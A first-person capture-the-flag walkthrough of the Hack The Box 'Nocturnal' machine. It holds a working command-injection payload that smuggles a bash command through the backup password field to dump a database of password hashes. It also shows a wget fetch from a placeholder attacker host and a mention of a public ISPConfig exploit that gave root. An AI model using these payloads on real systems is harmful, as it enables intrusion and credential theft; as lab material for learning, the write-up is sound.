# Nocturnal HTB - My Walkthrough (No External Walkthroughs Used)

## Basic Enumeration

Started with a simple `nmap` scan:

```
nmap -sV -sC --min-rate 500 <ip-address>
```

**Found:**

* `22/tcp` - SSH running on Ubuntu
* `80/tcp` - HTTP, redirects to `nocturnal.htb`

Added the IP and domain to `/etc/hosts`.

Visited `nocturnal.htb` in browser — there was a register and login page. I registered, logged in, and saw a file upload page.

Only file types allowed were `.doc`, `.pdf`, etc. — no `.php`.

## Web Directory Fuzzing

Used `ffuf`:

```
ffuf -u http://nocturnal.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 404
```

Found `admin.php`, but it redirects to login. Tried default creds like `admin`, `root` — nothing worked.

## Subdomain Fuzzing

```
ffuf -w SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u 'http://nocturnal.htb' -H 'Host: FUZZ.nocturnal.htb'
```

Saw all responses return 302 with size 154 — wildcard DNS maybe. So I filtered with `-fs 154`. Got nothing useful.

## File Upload Attempts

Tried uploading `.php` reverse shell with renamed extension like `.php.pdf` — it uploads, but doesn't execute.

Used Burp to intercept upload, tried changing content type to `application/x-php`, or uploading `.php` with `application/pdf`, but still no execution.

When viewing the uploaded file, the app hits `view.php?username=blah&file=php-reverse-shell-edited.php.pdf` — tried path traversal but it checks extensions, so blocked.

## Username Enumeration

Tried finding valid usernames using ffuf:

```
ffuf -w SecLists/Usernames/xato-net-10-million-usernames.txt -u "http://nocturnal.htb/view.php?username=FUZZ&file=dummy.pdf" -H "Cookie: PHPSESSID=<valid-session>" -fs 2985
```

Found valid users:

* `tobias`
* `amanda`
* `admin`

Checked for files under each user — found `privacy.odt` under `amanda` which had a password and a note saying she had access to all services.

## Amanda Access — Backup Feature

Logged in as `amanda`. Found a backup feature that zips everything with a user-supplied password. The entire source code gets zipped.

Found SQLite file at:

```
/var/www/nocturnal_database/nocturnal_database.db
```

Saw that password input in the backup function is sanitized, but URL-encoded newline (%0A) and tab (%09) were allowed.

### Exploit

Used Burp Repeater to send:

```
password=%0Abash%09-c%09"sqlite3%09/var/www/nocturnal_database/nocturnal_database.db%09.dump"%0A
```

Command being exploited:

```
$command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
```

So `%0A` breaks the zip command, and we run our own command via `bash -c`. The `.dump` returns the full DB content including user and admin hashes.

Cracked `tobias`'s hash — password was:

```
[redacted]
```

## SSH Access

SSH'd into the machine using `tobias`'s creds and got the user flag.

## Privilege Escalation

Uploaded and ran `linpeas.sh` via:

```
wget http://<attacker-ip>/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Checked all the red/highlighted stuff:

* SUID binaries
* CVE-2021-3156 (Baron Samedit)
* CVE-2021-3560 (polkit)
* Sendmail-related stuff

None of these worked.

Then noticed something I had missed — port `8080` was open.

## ISPConfig Exploit

Visited `http://localhost:8080` (via SSH forwarding or browser-based tunnel) and saw ISPConfig panel — version 3.2.10p1.

Vulnerable to CVE-2023-46818.

Googled and found a Python PoC exploit. Transferred it to the target and ran it. Got root shell and the root flag.

Rooted. ✅
